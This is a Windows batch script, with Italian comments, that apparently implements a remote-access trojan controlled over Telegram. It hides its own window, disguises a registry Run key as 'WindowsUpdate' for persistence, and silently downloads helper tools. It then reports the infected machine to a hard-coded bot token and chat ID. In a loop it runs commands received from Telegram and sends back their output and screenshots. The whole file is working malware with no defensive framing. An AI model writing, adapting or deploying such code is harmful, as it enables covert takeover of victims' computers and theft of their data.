@echo off
:: Modalità invisibile
if not "%1"=="hidden" (
    start /B /MIN cmd /c "%~f0" hidden >nul 2>&1
    exit /b
)

:: Aggiungi persistenza al registro (silenziosamente)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "\"%COMSPEC%\" /c start /min \"\" \"%~f0\" hidden" /f >nul 2>&1

:: Configurazione
set "TOKEN=7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%TOKEN%"
set "NIRCMD_URL=https://www.nirsoft.net/utils/nircmd.zip"
set "NIRCMD_PATH=%TEMP%\nircmd.exe"

:: Auto-installazione curl (invisibile)
where curl >nul 2>&1
if %errorlevel% neq 0 (
    bitsadmin /transfer getCurl /download /priority foreground "https://curl.se/windows/dl-8.4.0_4/curl-8.4.0_4-win64-mingw/bin/curl.exe" "%TEMP%\curl.exe" >nul 2>&1
    move "%TEMP%\curl.exe" "%WINDIR%\System32\" >nul 2>&1
)

:: Auto-installazione NirCmd (invisibile)
if not exist "%NIRCMD_PATH%" (
    curl -s -L -o "%TEMP%\nircmd.zip" "%NIRCMD_URL%" >nul 2>&1
    powershell -Command "Expand-Archive -Path '%TEMP%\nircmd.zip' -DestinationPath '%TEMP%\' -Force" >nul 2>&1
    move "%TEMP%\nircmd.exe" "%NIRCMD_PATH%" >nul 2>&1
    del "%TEMP%\nircmd.zip" >nul 2>&1
)

:: Notifica connessione
curl -s -X POST "%API_URL%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=🔌 [%COMPUTERNAME%] Shell persistente attivata come %USERNAME%" >nul

:main_loop
:: Rilevamento nuovi utenti
for /f "tokens=2 delims==" %%U in ('whoami') do set "current_user=%%U"
if not defined last_user set "last_user=%current_user%"

if not "%current_user%"=="%last_user%" (
    curl -s -X POST "%API_URL%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=👤 Nuovo accesso: %current_user% su %COMPUTERNAME%" >nul
    set "last_user=%current_user%"
)

:: Gestione comandi
curl -s "%API_URL%/getUpdates" > "%TEMP%\tg_updates.json"

for /f "tokens=2 delims=:," %%C in ('type "%TEMP%\tg_updates.json" ^| find /i "text"') do (
    set "command=%%C"
    set "command=!command:"=!"
    set "command=!command:~1!"
    
    if not "!command!"=="null" (
        !command! > "%TEMP%\cmd_out.txt" 2>&1
        set /p result=<"%TEMP%\cmd_out.txt"
        
        curl -s -X POST "%API_URL%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=📟 [%COMPUTERNAME%]: !result!" >nul
        
        "%NIRCMD_PATH%" savescreenshot "%TEMP%\sc.png" >nul 2>&1
        curl -s -F "chat_id=%CHAT_ID%" -F document=@"%TEMP%\sc.png" "%API_URL%/sendDocument" >nul
        del "%TEMP%\sc.png" >nul 2>&1
        
        for /f "tokens=2 delims=:," %%U in ('type "%TEMP%\tg_updates.json" ^| find /i "update_id"') do (
            set /a "last_update=%%U+1"
            curl -s "%API_URL%/getUpdates?offset=!last_update!" >nul
        )
    )
)

:: Pulizia e ciclo
del "%TEMP%\tg_updates.json" >nul 2>&1
del "%TEMP%\cmd_out.txt" >nul 2>&1
timeout /t 5 >nul
goto main_loop
